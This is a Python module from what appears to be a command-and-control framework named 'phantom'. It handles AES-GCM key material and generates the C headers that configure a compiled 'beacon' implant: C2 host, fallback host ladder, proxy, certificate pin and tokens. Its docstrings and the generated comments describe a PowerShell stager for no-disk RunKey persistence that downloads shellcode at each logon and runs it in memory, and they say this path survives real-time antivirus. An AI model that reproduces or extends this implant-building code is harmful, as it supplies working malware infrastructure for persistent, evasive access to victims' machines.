"""Shared C2 encryption key material and authenticated encryption (AES-GCM)."""
import hashlib
import os as _os
import base64
import secrets as _secrets
from typing import List, Optional
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from phantom.utils.state import get_secret, regenerate_secret


def _aes_key() -> str:
    return get_secret("PHANTOM_C2_KEY", lambda: _secrets.token_hex(16))


def _aes_nonce_value() -> str:
    return get_secret("PHANTOM_C2_NONCE", lambda: _secrets.token_hex(6))


def _derive_to_length(raw: bytes, target_len: int) -> bytes:
    """Normalise a key value to exactly *target_len* bytes.

    - Exact length → return as-is.
    - 2× target-length hex → decode.
    - Otherwise → SHA-256 digest truncated / padded to target_len.
    """
    if len(raw) == target_len:
        return raw
    # hex-encoded?
    if len(raw) == target_len * 2 and all(c in b"0123456789abcdefABCDEF" for c in raw):
        try:
            return bytes.fromhex(raw.decode())
        except ValueError:
            pass
    # base64-encoded?  (len == ceil(target_len * 4/3) without padding)
    import base64 as _b64
    try:
        decoded = _b64.b64decode((raw + b"=" * (-len(raw) % 4)).decode("ascii"))
        if len(decoded) == target_len:
            return decoded
    except (ValueError, UnicodeDecodeError):
        pass
    # Last resort: deterministic derivation — still unique per-provided-value.
    return hashlib.sha256(raw).digest()[:target_len]


def get_aes_key() -> bytes:
    value = _aes_key()
    return _derive_to_length(value.encode(), 32)


def get_aes_nonce() -> bytes:
    value = _aes_nonce_value()
    return _derive_to_length(value.encode(), 12)


def get_payload_token() -> str:
    return get_secret("PHANTOM_PAYLOAD_TOKEN", lambda: _secrets.token_urlsafe(32))


def get_api_token() -> str:
    return get_secret("PHANTOM_API_TOKEN", lambda: _secrets.token_urlsafe(32))


def regenerate_api_token() -> str:
    """Rotate the API token and return the new value."""
    return regenerate_secret("PHANTOM_API_TOKEN", lambda: _secrets.token_urlsafe(32))


def encrypt_data(plaintext: str) -> str:
    """Encrypt plaintext with AES-256-GCM using a random nonce.
    Format: base64(random_12_byte_nonce || ciphertext || 16_byte_tag).
    """
    try:
        aesgcm = AESGCM(get_aes_key())
        nonce = _os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)
        return base64.b64encode(nonce + ciphertext).decode()
    except Exception:
        return ""


def decrypt_data(ciphertext_b64: str) -> str:
    """Decrypt base64-encoded AES-256-GCM ciphertext with prepended nonce."""
    try:
        raw = base64.b64decode(ciphertext_b64, validate=True)
        if len(raw) < 12 + 16:
            return ""
        nonce, ciphertext = raw[:12], raw[12:]
        aesgcm = AESGCM(get_aes_key())
        return aesgcm.decrypt(nonce, ciphertext, None).decode()
    except Exception:
        return ""


def crypto_fingerprint() -> str:
    """Stable hash of current key material (for rebuild detection)."""
    material = get_aes_key() + b"|" + get_aes_nonce()
    return hashlib.sha256(material).hexdigest()


def _bytes_to_c_array(data: bytes) -> str:
    return ", ".join(f"0x{b:02x}" for b in data)


def _c2_literal(value: str) -> str:
    """A host/IP safe inside a C++ string literal and a CSV define.

    Anything carrying a quote, a backslash, a comma, whitespace or a newline
    is dropped instead of escaped: a silently mangled C2 endpoint is far
    worse than a missing fallback (the beacon would dial a host that is not
    the one the operator typed).
    """
    raw = str(value or "").strip().strip('"')
    if not raw:
        return ""
    if any(ch in raw for ch in '"\\, \t\r\n'):
        return ""
    return raw[:253]


def beacon_config_endpoint(beacon_dir: str) -> Optional[tuple]:
    """(host, port) already embedded in `c2_config.h`, or None.

    The callers used to decide "does this need a rebuild?" by comparing the
    whole rendered header against the file — which is ALWAYS different, since
    the builder adds the ladder, the proxy and the pin. The result was a
    forced full recompile on every build (minutes, and the freshness fast
    path never taken). What actually matters for a rebuild is the endpoint
    burned into the binary, so that is what gets compared.
    """
    import re
    path = _os.path.join(beacon_dir, "src", "c2_config.h")
    if not _os.path.exists(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as handle:
            text = handle.read()
    except OSError:
        return None
    host = re.search(r'^#define\s+C2_HOST\s+"([^"]*)"', text, re.M)
    port = re.search(r'^#define\s+C2_PORT\s+(\d+)', text, re.M)
    if not host or not port:
        return None
    return host.group(1), int(port.group(1))


def server_cert_fingerprint(cert_path: str = "") -> str:
    """SHA-256 of the C2's DER certificate, lowercase hex — the pin value.

    Same digest the beacon computes at runtime (Windows `CryptHashCertificate`
    over `pbCertEncoded`, OpenSSL `X509_digest`): SHA-256 over DER, so a pin
    emitted here is directly comparable with what the beacon sees. Stdlib only
    (`ssl.PEM_cert_to_DER_cert`), so this works without the `cryptography`
    stack and without re-implementing PEM parsing.

    Returns "" when no certificate is present: the caller decides what an
    absent pin means (a build with no pin accepts ANY server certificate).
    """
    import ssl as _ssl
    if not cert_path:
        try:
            from phantom.utils.paths import certs_dir
            from phantom.utils.state import use_mtls
            names = (["mtls_server.crt", "server.crt"] if use_mtls()
                     else ["server.crt", "mtls_server.crt"])
            for name in names:
                candidate = _os.path.join(certs_dir(), name)
                if _os.path.exists(candidate):
                    cert_path = candidate
                    break
        except Exception:
            return ""
    if not cert_path or not _os.path.exists(cert_path):
        return ""
    try:
        with open(cert_path, "r", encoding="utf-8") as handle:
            pem = handle.read()
        der = _ssl.PEM_cert_to_DER_cert(pem)
    except Exception:
        return ""
    return hashlib.sha256(der).hexdigest()


def write_beacon_c2_config(beacon_dir: str, host: str = "127.0.0.1",
                           port: int = 8080, use_ssl: bool = True,
                           ps_stager_b64: str = "",
                           hosts: Optional[List[str]] = None,
                           proxy: str = "",
                           pin: str = "") -> str:
    """Generate c2_config.h from C2 host/port/ssl for beacon compilation.

    Also embeds the compact PowerShell stager (``C2_PS_STAGER_B64``) so the
    beacon's persistence command can install a NO-DISK RunKey: at logon the
    stager re-downloads the XOR PIC from /x and runs it in-memory, a path
    field-tested to survive real-time AV (the on-disk PE gets execution-
    blocked). The stager is generated by ``phantom.utils.builder`` (which
    owns dropper generation) and passed in here to avoid a circular import.
    Pass ``ps_stager_b64=""`` to fall back to classic PE persist.
    """
    src_dir = _os.path.join(beacon_dir, "src")
    _os.makedirs(src_dir, exist_ok=True)
    path = _os.path.join(src_dir, "c2_config.h")
    host = _c2_literal(host) or "127.0.0.1"
    ladder = []
    for candidate in (hosts or []):
        clean = _c2_literal(candidate)
        if clean and clean != host and clean not in ladder:
            ladder.append(clean)
    proxy = _c2_literal(proxy)
    # A pin is a SHA-256 digest or nothing: an arbitrary string here would
    # escape the literal (or, worse, pin a peer nobody can verify).
    pin = pin.strip().lower()
    if len(pin) != 64 or any(c not in "0123456789abcdef" for c in pin):
        pin = ""
    # Built outside the template: a nested triple quote would terminate it.
    pin_block = ""
    if pin:
        pin_block = (
            "// Pinned C2 certificate fingerprint. With a pin present the\n"
            "// beacon accepts exactly ONE peer, independently of mTLS: TLS\n"
            "// without a pin completes a handshake with ANY server (the payload\n"
            "// is still AES-GCM sealed, but the peer is unauthenticated). The\n"
            "// digest covers the DER certificate and is compared byte-for-byte\n"
            "// by the runtime verifier.\n"
            f'#define BEACON_SERVER_FINGERPRINT "{pin}"\n')
    content = f"""#pragma once
// Auto-generated by phantom.utils.c2_crypto — do not edit manually.
#define C2_HOST "{host}"
// Fallback ladder behind C2_HOST (comma-separated, may be empty). The
// beacon rotates through it after a per-endpoint failure budget, so a
// filtered address or a retired redirector does not end the engagement.
#define C2_HOSTS "{','.join(ladder)}"
#define C2_PORT {port}
#define C2_USE_HTTPS {1 if use_ssl else 0}
// Explicit proxy URL ("" = follow the endpoint's own proxy configuration).
#define C2_PROXY "{proxy}"
#define C2_PAYLOAD_TOKEN "{get_payload_token()}"
// No-disk persistence stager (powershell one-liner, base64): the RunKey
// launches THIS instead of an on-disk EXE, so nothing malicious sits on
// disk. Empty = fall back to classic PE persistence.
#define C2_PS_STAGER_B64 "{ps_stager_b64}"
{"#define C2_HAS_PS_STAGER 1" if ps_stager_b64 else ""}
{pin_block}
#if __has_include("beacon_auth.h")
#include "beacon_auth.h"
#endif
"""
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    return path


def write_beacon_crypto_config(beacon_dir: str) -> str:
    """Generate crypto_config.h for beacon compilation."""
    src_dir = _os.path.join(beacon_dir, "src")
    _os.makedirs(src_dir, exist_ok=True)
    path = _os.path.join(src_dir, "crypto_config.h")
    key, nonce = get_aes_key(), get_aes_nonce()
    content = f"""#pragma once
// Auto-generated by phantom.utils.c2_crypto — do not edit manually.
static const unsigned char AES_KEY[]   = {{ {_bytes_to_c_array(key)} }};
static const unsigned char AES_NONCE[] = {{ {_bytes_to_c_array(nonce)} }};
"""
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    return path